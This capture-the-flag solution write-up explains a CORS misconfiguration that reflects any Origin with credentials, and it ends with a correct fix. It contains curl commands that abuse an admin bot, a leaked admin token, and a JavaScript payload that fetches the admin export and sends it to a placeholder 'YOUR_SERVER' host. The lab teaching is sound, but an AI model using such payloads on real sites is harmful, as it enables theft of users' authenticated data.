# CORS Misconfiguration - Solution

## Vulnerability

The API at `/api/admin/export` reflects any `Origin` header with `Access-Control-Allow-Credentials: true`.
This is a classic CORS misconfiguration that allows any origin to make credentialed cross-origin requests.

The admin bot visits URLs from `/api/report-url` and includes the admin `Authorization` header.

## Exploit Chain

### Method 1: Using /cors-demo as pivot (recommended)

The API hosts a `/cors-demo` page that makes an authenticated fetch to `/api/admin/export`
and POSTs the result to `/capture`. Since both requests are same-server, no CORS issues.

**Step 1:** Submit the cors-demo URL for the admin bot to visit:
```bash
curl -X POST http://TARGET:8080/api/report-url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://api:8080/cors-demo?target=http://api:8080/api/admin/export&to=http://api:8080/capture"}'
```

**Step 2:** Wait ~15 seconds for the bot to process it, then retrieve the captured data:
```bash
curl http://TARGET:8080/captured
```

Response will contain:
```json
{"flag": "HL4{...}", "data": "sensitive admin export data", "users": ["admin", "user1"]}
```

### Method 2: Direct API access with leaked token

The admin token `admin-api-token-secret-abc` is visible in the bot source code.
If you can read bot.py (e.g., via another vulnerability), use it directly:
```bash
curl http://TARGET:8080/api/admin/export \
  -H "Authorization: Bearer admin-api-token-secret-abc"
```

### Method 3: CORS PoC (if you have a server reachable by the bot)

If you have a server reachable from the Docker network:
```html
<script>
fetch('http://api:8080/api/admin/export', {
    credentials: 'include',
    headers: {'Authorization': 'Bearer admin-api-token-secret-abc'}
}).then(r => r.json()).then(data => {
    fetch('http://YOUR_SERVER/?flag=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```

## Why the CORS is broken

```python
# Vulnerable code in app.py:
'Access-Control-Allow-Origin': origin,  # Reflects ANY origin
'Access-Control-Allow-Credentials': 'true',  # Allows cookies/auth headers
```

Per the CORS spec, if `Access-Control-Allow-Credentials: true`, the browser should
reject `Access-Control-Allow-Origin: *`, but reflecting the specific origin is equivalent
and bypasses the restriction — the browser WILL send credentials to any reflected origin.

## Step-by-step walkthrough

1. Probe the API: `curl http://TARGET:8080/` to see available endpoints.
2. Try `/api/admin/export` without auth — get 403.
3. Notice `/api/report-url` accepts URLs for admin review.
4. Notice `/cors-demo` is a pivot page that fetches an endpoint and exfiltrates the response.
5. Notice `/captured` stores what was POSTed to `/capture`.
6. The bot reads `/tmp/pending_urls.txt`, which the API writes to on each `/api/report-url` call.
7. Submit the cors-demo URL pointing at the export endpoint → bot visits it → admin token used → flag captured.
8. Read `/captured` to get the flag.

## CORS fix (what should have been done)

```python
ALLOWED_ORIGINS = {'https://trusted-frontend.example.com'}

def get_cors_headers():
    origin = request.headers.get('Origin', '')
    if origin in ALLOWED_ORIGINS:
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Credentials': 'true',
            ...
        }
    # Do NOT reflect arbitrary origins with credentials
    return {}
```
